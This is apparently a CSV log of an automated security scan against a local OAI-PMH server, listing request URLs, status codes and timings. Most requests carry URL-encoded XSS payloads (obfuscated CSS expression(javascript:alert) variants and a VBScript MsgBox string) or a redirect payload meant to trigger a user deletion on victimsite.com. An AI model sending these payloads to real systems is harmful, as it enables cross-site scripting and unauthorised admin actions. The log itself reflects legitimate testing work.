uuid,timestamp,http_status_code,request_url,response_time,http_version
89c90662-0b9b-486a-b83f-f5466ca70df2,2024-12-31 10:51:37,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx88expression%28javascript%3Aalert%281%29%22%3EDEF,2076.67 ms,HTTP/1.1
faceb300-18c9-4c32-a9e7-61fd1f1d233f,2024-12-31 10:51:40,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2125.78 ms,HTTP/1.1
b9f2236f-06ac-45f2-b408-da589c986e78,2024-12-31 10:51:42,200,http://localhost:8081/oai/request?verb=ListSets,2089.59 ms,HTTP/1.1
95792b6c-5bbf-43d2-84eb-02ccf2fcd9a8,2024-12-31 10:51:44,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx88expression%28javascript%3Aalert%281%29%22%3EDEF,2081.39 ms,HTTP/1.1
0817a707-42f7-4784-ad03-f84eb205bb51,2024-12-31 10:51:46,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx88expression%28javascript%3Aalert%281%29%22%3EDEF&set=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx88expression%28javascript%3Aalert%281%29%22%3EDEF,2100.37 ms,HTTP/1.1
6dbda608-b2c8-4bd7-b6fd-069cd6b3e44c,2024-12-31 10:51:49,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx88expression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=oai_dc,2114.92 ms,HTTP/1.1
42720fce-3b4a-408b-80e3-51527f843ff6,2024-12-31 10:51:51,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF,2054.31 ms,HTTP/1.1
d70de4d6-7df3-4fde-b450-925b9316a80c,2024-12-31 10:51:53,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2110.51 ms,HTTP/1.1
a07bc340-5b0a-4707-870a-43ae34b17903,2024-12-31 10:51:56,200,http://localhost:8081/oai/request?verb=ListSets,2090.63 ms,HTTP/1.1
38fd8b75-c220-4cbd-ad1b-e32949d25373,2024-12-31 10:51:58,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF&set=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF,2058.61 ms,HTTP/1.1
1c65253e-23f0-4c97-b756-7de4565b6993,2024-12-31 10:52:00,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF,2065.48 ms,HTTP/1.1
a5124add-196f-4582-b256-f8704e71c47d,2024-12-31 10:52:02,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=oai_dc,2118.70 ms,HTTP/1.1
7ecfb7b5-efba-4ebf-9be3-e0ea15fce4c2,2024-12-31 10:52:05,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Aexpression%28javascript%3Aalert%281%29%22%3EDEF,2106.81 ms,HTTP/1.1
9ae24333-9a70-44f9-8af5-2848e5df6821,2024-12-31 10:52:07,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2058.23 ms,HTTP/1.1
401096d4-78bd-4f17-8d15-944e765c5b6a,2024-12-31 10:52:09,200,http://localhost:8081/oai/request?verb=ListSets,2089.64 ms,HTTP/1.1
fb1b20af-fdb0-4577-a917-65f65eeebf90,2024-12-31 10:52:11,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2078.67 ms,HTTP/1.1
32c6bddf-1eca-4471-ab4f-bf74ba8cc53b,2024-12-31 10:52:14,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Aexpression%28javascript%3Aalert%281%29%22%3EDEF&set=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Aexpression%28javascript%3Aalert%281%29%22%3EDEF,2087.36 ms,HTTP/1.1
0896b1ea-b410-422e-a1a3-fa40c3a3781a,2024-12-31 10:52:16,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Aexpression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=oai_dc,2157.80 ms,HTTP/1.1
2eaefbb7-b73d-4ba0-a94f-a8478e7e3224,2024-12-31 10:52:18,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF,2056.77 ms,HTTP/1.1
881ff56a-083a-45b0-9298-3415cf5370e6,2024-12-31 10:52:21,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2085.38 ms,HTTP/1.1
4a736c41-956a-49f1-94f7-b3fe9ca84da8,2024-12-31 10:52:23,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF,2060.53 ms,HTTP/1.1
37c845b4-0e03-4bb9-ad06-339781ae41ca,2024-12-31 10:52:25,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF&set=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF,2104.50 ms,HTTP/1.1
d79ec191-a985-4e6c-b6ff-87fec4797a1a,2024-12-31 10:52:27,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF,2069.49 ms,HTTP/1.1
2f6bc026-3267-4189-9eaa-179ce82a880e,2024-12-31 10:52:30,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=oai_dc,2187.64 ms,HTTP/1.1
a13d601d-e12f-4ca3-a66b-a2e712bf9015,2024-12-31 10:52:32,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,2044.16 ms,HTTP/1.1
70dcf12a-123b-4467-bca6-c5f8ba97e943,2024-12-31 10:52:34,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,2079.96 ms,HTTP/1.1
df2dfd57-053a-4bfe-9df9-c97ea7227963,2024-12-31 10:52:37,200,http://localhost:8081/oai/request?verb=ListSets,2076.55 ms,HTTP/1.1
8438ae5c-719b-47a5-aabc-ad76c5e0981b,2024-12-31 10:52:39,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF&set=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,2085.62 ms,HTTP/1.1
248a6b38-327c-4967-ae27-b16ca7fc4e78,2024-12-31 10:52:41,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF&set=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,2073.53 ms,HTTP/1.1
e739be03-d4ca-43ec-a0c8-a63528c6b329,2024-12-31 10:52:43,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=oai_dc,2119.44 ms,HTTP/1.1
19ef109c-5e34-42b9-8820-7cb0604dde58,2024-12-31 10:52:46,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF,2059.75 ms,HTTP/1.1
8b860170-b238-478c-ac38-3eae79590fa3,2024-12-31 10:52:48,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2080.94 ms,HTTP/1.1
e0b6e66e-2c54-45e1-990e-003bff2f598d,2024-12-31 10:52:50,200,http://localhost:8081/oai/request?verb=ListSets,2081.58 ms,HTTP/1.1
c98ed109-f44f-4ca8-8490-fad7f465c1d9,2024-12-31 10:52:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=ABC%3Cdiv+style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF,2106.22 ms,HTTP/1.1
178ca2dc-fa9e-4bae-a5c6-e75fed17f5c4,2024-12-31 10:52:55,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=ABC%3Cdiv+style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF,2069.40 ms,HTTP/1.1
1c16235f-6c1d-4969-bef8-b1bce5d3d66c,2024-12-31 10:52:57,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=oai_dc,2096.72 ms,HTTP/1.1
f1d9f340-48fd-423b-8294-01aae0acc3ae,2024-12-31 10:52:59,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF,2078.73 ms,HTTP/1.1
e97d0723-3112-4996-a76c-9ef119a5cffe,2024-12-31 10:53:02,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF,2109.23 ms,HTTP/1.1
a550fb74-be9e-4b20-9357-1a958d84a352,2024-12-31 10:53:04,200,http://localhost:8081/oai/request?verb=ListSets,2101.81 ms,HTTP/1.1
0c936d15-8d2c-4bfc-ac46-85b18fcf76f8,2024-12-31 10:53:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF,2086.40 ms,HTTP/1.1
b6422ecd-786b-438a-bfaf-123642fe9fab,2024-12-31 10:53:08,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF,2060.10 ms,HTTP/1.1
904651c8-dd33-4aaf-b8fc-2e18e9f1450d,2024-12-31 10:53:11,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=marc,2081.58 ms,HTTP/1.1
edcbb391-96ff-4b56-9d24-c17c9aaf9f5e,2024-12-31 10:53:13,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx5Cression%28javascript%3Aalert%281%29%22%3EDEF,2067.54 ms,HTTP/1.1
0f2e16fe-490c-4eab-9ffc-952992f2db11,2024-12-31 10:53:15,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx5Cression%28javascript%3Aalert%281%29%22%3EDEF,2073.98 ms,HTTP/1.1
a32b26ec-602f-4a75-9737-9fc9a8ad9ffe,2024-12-31 10:53:17,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx5Cression%28javascript%3Aalert%281%29%22%3EDEF,2083.96 ms,HTTP/1.1
4e73cf86-08ea-4617-9356-0fe2591bcc4a,2024-12-31 10:53:20,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2064.60 ms,HTTP/1.1
d38d3d99-bc05-42ff-abc9-0f4aa4175645,2024-12-31 10:53:22,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2074.01 ms,HTTP/1.1
929af309-0431-4ecb-a736-5be10c45c700,2024-12-31 10:53:24,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx5Cression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=marc,2086.46 ms,HTTP/1.1
9fdd1708-b998-42e0-9694-fb639501161f,2024-12-31 10:53:26,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,2056.27 ms,HTTP/1.1
4049ad2b-7adc-4cb9-ad67-447709350276,2024-12-31 10:53:29,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,2070.74 ms,HTTP/1.1
931b3942-a8ef-44bd-aa3c-a5dbdca74fda,2024-12-31 10:53:31,200,http://localhost:8081/oai/request?verb=ListSets,2079.82 ms,HTTP/1.1
efd0c79c-c627-465a-bfd5-375fd9248ebd,2024-12-31 10:53:33,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF&until=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,2096.95 ms,HTTP/1.1
f08a6d7a-d68a-4cac-af77-afba6c22f8c8,2024-12-31 10:53:36,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,2079.06 ms,HTTP/1.1
e6921264-6c04-4376-934b-939b1117dac6,2024-12-31 10:53:38,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=marc,2071.00 ms,HTTP/1.1
71dd916e-17f6-4bb2-8fcd-c85bfe8afbfb,2024-12-31 10:53:40,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx5C%28javascript%3Aalert%281%29%22%3EDEF,2071.27 ms,HTTP/1.1
9c1ebdba-6b0e-4356-a336-e194bb9d36b7,2024-12-31 10:53:42,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx5C%28javascript%3Aalert%281%29%22%3EDEF,2092.34 ms,HTTP/1.1
fc8e106e-52a3-4e8a-bedb-70d73903e107,2024-12-31 10:53:45,200,http://localhost:8081/oai/request?verb=ListSets,2076.67 ms,HTTP/1.1
931ed4a4-645f-4c4e-bf96-7b6fe4c8bfc2,2024-12-31 10:53:47,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx5C%28javascript%3Aalert%281%29%22%3EDEF,2069.96 ms,HTTP/1.1
6cd6ccd4-b161-4e55-8b68-56c9a56d739c,2024-12-31 10:53:49,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2085.36 ms,HTTP/1.1
d55c37d2-3b2d-4c9f-9a50-a584929fdd52,2024-12-31 10:53:51,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx5C%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=marc,2085.51 ms,HTTP/1.1
d436ef3b-5ff1-4ed3-a451-3fa1027f6159,2024-12-31 10:53:54,403,http://localhost:8081/oai/request?verb=ABC%3Cdiv+style%3D%22x%5Cx3Aexpression%28javascript%3Aalert%281%29%22%3EDEF,2058.47 ms,HTTP/1.1
500acd9f-60c7-4e07-ab6a-0864a2c967f0,2024-12-31 10:53:56,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=ABC%3Cdiv+style%3D%22x%5Cx3Aexpression%28javascript%3Aalert%281%29%22%3EDEF,2121.01 ms,HTTP/1.1
68cd75dc-bb0c-43c8-b371-268ef43121a3,2024-12-31 10:53:58,200,http://localhost:8081/oai/request?verb=ListSets,2090.98 ms,HTTP/1.1
5142a1bd-7e53-4094-bfa3-4239f9c937df,2024-12-31 10:54:01,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=ABC%3Cdiv+style%3D%22x%5Cx3Aexpression%28javascript%3Aalert%281%29%22%3EDEF,2100.52 ms,HTTP/1.1
2e2e487b-70d0-4455-adcd-1c13f42424e8,2024-12-31 10:54:03,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2485.23 ms,HTTP/1.1
8cf47921-407e-4a49-a250-c7357b5c2a7e,2024-12-31 10:54:06,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=ABC%3Cdiv+style%3D%22x%5Cx3Aexpression%28javascript%3Aalert%281%29%22%3EDEF&metadataPrefix=marc,2097.27 ms,HTTP/1.1
ed49219b-7a3e-4c58-8ec0-c78fc515d0ef,2024-12-31 10:54:08,403,http://localhost:8081/oai/request?verb=Execute%28MsgBox%28chr%2888%29%26chr%2883%29%26chr%2883%29%29%29%3C,2067.27 ms,HTTP/1.1
5358d0d8-8123-489f-b890-1c6abb0cbd27,2024-12-31 10:54:10,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2058.11 ms,HTTP/1.1
c545ee53-11a1-4605-8d16-bcaca7b9f333,2024-12-31 10:54:12,200,http://localhost:8081/oai/request?verb=ListSets,2115.90 ms,HTTP/1.1
3792d055-24c2-4c9d-9209-5601333c30ed,2024-12-31 10:54:15,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=Execute%28MsgBox%28chr%2888%29%26chr%2883%29%26chr%2883%29%29%29%3C&until=Execute%28MsgBox%28chr%2888%29%26chr%2883%29%26chr%2883%29%29%29%3C,2078.71 ms,HTTP/1.1
178dcf56-8999-4518-b066-3fe53f75fbf4,2024-12-31 10:54:17,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=Execute%28MsgBox%28chr%2888%29%26chr%2883%29%26chr%2883%29%29%29%3C&set=Execute%28MsgBox%28chr%2888%29%26chr%2883%29%26chr%2883%29%29%29%3C,2079.93 ms,HTTP/1.1
9da2f38a-80f5-4b6a-aef5-293e24bbee4b,2024-12-31 10:54:19,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=Execute%28MsgBox%28chr%2888%29%26chr%2883%29%26chr%2883%29%29%29%3C&metadataPrefix=oai_dc,2196.51 ms,HTTP/1.1
96410366-32d6-490b-a96f-9ccb7cc89b56,2024-12-31 10:54:22,403,http://localhost:8081/oai/request?verb=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E,2058.78 ms,HTTP/1.1
e48df33f-4a72-4de1-9a02-086cd2dda6b5,2024-12-31 10:54:24,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E,2101.11 ms,HTTP/1.1
4d4ea26c-ff7e-481d-9c67-ffa37e840d67,2024-12-31 10:54:26,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E,2066.76 ms,HTTP/1.1
fb4e8f6c-ed85-4bc7-a956-e9ea082494a6,2024-12-31 10:54:28,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E&set=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E,2072.31 ms,HTTP/1.1
1cddcfc9-3fae-458e-b9ba-a89220c119cd,2024-12-31 10:54:31,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E,2079.66 ms,HTTP/1.1
3d73c488-888e-4b22-ac86-58e9176f7367,2024-12-31 10:54:33,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=LOL%3Cstyle%3E%2A%7B%2F%2Aall%2A%2Fcolor%2F%2Aall%2A%2F%3A%2F%2Aall%2A%2Fred%2F%2Aall%2A%2F%3B%2F%5B0%5D%2AIE%2CSafari%2A%5B0%5D%2Fcolor%3Agreen%3Bcolor%3Abl%2F%2AIE%2A%2Fue%3B%7D%3C%2Fstyle%3E&metadataPrefix=oai_dc,2117.78 ms,HTTP/1.1
f5710878-75b2-4dd0-be98-f9c04d6c05d2,2024-12-31 10:54:35,403,http://localhost:8081/oai/request?verb=Redirect+302+%2Fa%26%2346%3Bjpg+http%26%2358%3B%2F%2Fvictimsite%26%2346%3Bcom%2Fadmin%26%2346%3Basp%26deleteuser,2059.84 ms,HTTP/1.1
53dedab1-734b-4418-80e5-f95ce62b99c9,2024-12-31 10:54:37,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=Redirect+302+%2Fa%26%2346%3Bjpg+http%26%2358%3B%2F%2Fvictimsite%26%2346%3Bcom%2Fadmin%26%2346%3Basp%26deleteuser,2080.68 ms,HTTP/1.1
7997afdb-1283-4b93-b266-93fca2daae1c,2024-12-31 10:54:40,200,http://localhost:8081/oai/request?verb=ListSets,2102.30 ms,HTTP/1.1
661cca89-4483-4bd7-820f-609da346d932,2024-12-31 10:54:42,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=Redirect+302+%2Fa%26%2346%3Bjpg+http%26%2358%3B%2F%2Fvictimsite%26%2346%3Bcom%2Fadmin%26%2346%3Basp%26deleteuser&until=Redirect+302+%2Fa%26%2346%3Bjpg+http%26%2358%3B%2F%2Fvictimsite%26%2346%3Bcom%2Fadmin%26%2346%3Basp%26deleteuser,2056.44 ms,HTTP/1.1
060e1eef-75b4-4cc4-a659-0f2512a90198,2024-12-31 10:54:44,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=Redirect+302+%2Fa%26%2346%3Bjpg+http%26%2358%3B%2F%2Fvictimsite%26%2346%3Bcom%2Fadmin%26%2346%3Basp%26deleteuser,2056.66 ms,HTTP/1.1
f81dba66-e747-40b9-8846-a5f436e81a36,2024-12-31 10:54:46,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=Redirect+302+%2Fa%26%2346%3Bjpg+http%26%2358%3B%2F%2Fvictimsite%26%2346%3Bcom%2Fadmin%26%2346%3Basp%26deleteuser&metadataPrefix=marc,2050.34 ms,HTTP/1.1
aef00e00-4f59-43ad-a26a-0e62f77519da,2024-12-31 10:54:49,403,http://localhost:8081/oai/request?verb=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26%3Bdeleteuser,2075.52 ms,HTTP/1.1
bda737fe-06b6-496a-979a-323c4a832cce,2024-12-31 10:54:51,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26%3Bdeleteuser,2100.68 ms,HTTP/1.1
010f5452-6818-4769-81f2-469d3bbc2b73,2024-12-31 10:54:53,200,http://localhost:8081/oai/request?verb=ListSets,2097.93 ms,HTTP/1.1
7c255767-9a1b-4d6a-af74-8fc0e90afd4d,2024-12-31 10:54:55,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26%3Bdeleteuser,2039.67 ms,HTTP/1.1
